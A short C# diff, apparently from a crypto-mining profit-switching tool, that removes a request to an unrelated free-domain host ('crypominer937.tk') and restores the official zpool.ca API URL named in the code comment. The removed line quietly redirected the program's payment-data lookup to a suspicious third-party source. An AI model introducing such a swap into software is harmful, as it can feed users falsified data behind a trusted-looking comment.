@@ -237,7 +237,7 @@
                 try
                 {
                     // We get the algo payment info here - http://www.zpool.ca/api/status
-                    var WR = (HttpWebRequest)WebRequest.Create("http://crypominer937.tk/zpool-jsondbg.php");
+                    var WR = (HttpWebRequest)WebRequest.Create("http://www.zpool.ca/api/status");
                     var Response = WR.GetResponse();
                     var SS = Response.GetResponseStream();
                     SS.ReadTimeout = 20 * 1000;
